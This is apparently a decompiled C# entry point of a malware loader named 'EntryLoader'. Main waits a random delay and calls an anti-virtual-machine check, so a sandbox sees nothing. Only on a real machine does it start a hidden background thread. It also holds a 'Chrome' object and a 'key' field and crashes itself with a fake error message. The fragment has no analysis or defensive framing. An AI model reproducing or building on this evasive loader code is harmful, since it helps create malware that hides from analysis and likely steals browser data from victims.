using System;
using System.Threading;

namespace EntryLoader
{
	// Token: 0x02000030 RID: 48
	internal class EntryPoint
	{
		// Token: 0x0600007D RID: 125 RVA: 0x00006E40 File Offset: 0x00005040
		public static void activate_check()
		{
			try
			{
				EntryPoint.activation = false;
			}
			catch
			{
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00006E68 File Offset: 0x00005068
		public static int Main(string[] args)
		{
			Thread.Sleep(new Random().Next(3, 5) * 1000);
			EntryPoint.activate_check();
			if (!AntiVM.CheckVM())
			{
				EntryPoint.close = false;
				Thread thread = new Thread(new ThreadStart(EntryPoint.run.Start));
				thread.IsBackground = true;
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			for (;;)
			{
				if (EntryPoint.close)
				{
					Environment.FailFast("Program has been crashed");
				}
				else
				{
					Thread.Sleep(1000);
				}
			}
		}

		// Token: 0x04000035 RID: 53
		protected static Starter run = new Starter();

		// Token: 0x04000036 RID: 54
		public static Chrome chrome = new Chrome();

		// Token: 0x04000037 RID: 55
		public static bool close = true;

		// Token: 0x04000038 RID: 56
		public static string key = "";

		// Token: 0x04000039 RID: 57
		public static bool activation = false;
	}
}
